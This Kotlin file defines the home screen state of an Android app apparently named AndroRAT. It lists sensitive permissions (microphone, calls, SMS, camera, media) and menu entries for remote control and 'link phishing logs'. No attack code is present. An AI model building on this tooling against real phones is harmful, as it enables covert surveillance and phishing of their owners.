package com.ierusalem.androrat.features.home.domain

import android.Manifest
import android.os.Build
import androidx.compose.runtime.Immutable
import com.ierusalem.androrat.R
import com.ierusalem.androrat.features.home.domain.model.Category
import com.ierusalem.androrat.features.home.domain.model.DrawerClicks
import com.ierusalem.androrat.features.home.domain.model.UserProfile

@Immutable
data class HomeScreenState(

    val permissions : MutableMap<String, Boolean> = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) mutableMapOf(
        Manifest.permission.RECORD_AUDIO to false,
        Manifest.permission.CALL_PHONE to false,
        Manifest.permission.READ_MEDIA_IMAGES to false,
        Manifest.permission.READ_MEDIA_AUDIO to false,
        Manifest.permission.CAMERA to false,
        Manifest.permission.READ_SMS to false,
    ) else mutableMapOf(
        Manifest.permission.RECORD_AUDIO to false,
        Manifest.permission.CALL_PHONE to false,
        Manifest.permission.READ_EXTERNAL_STORAGE to false,
        Manifest.permission.CAMERA to false,
        Manifest.permission.READ_SMS to false,
    ),
    val categories: List<Category> = listOf(
        Category(R.string.andro_rtc, R.drawable.controller, DrawerClicks.NavigateToAndroRtc),
        Category(R.string.link_phishing_logs, R.drawable.link_alt, DrawerClicks.NavigateToLinkPhishing),
        Category(R.string.settings, R.drawable.settings_sharp, DrawerClicks.NavigateToSettings),
    ),
    val userProfile:UserProfile = UserProfile(
        username = "IerusalemX",
        avatarUrl = "https://guide-images.cdn.ifixit.com/igi/v6bM4OpwhDPjSmRd.large"
    )
)

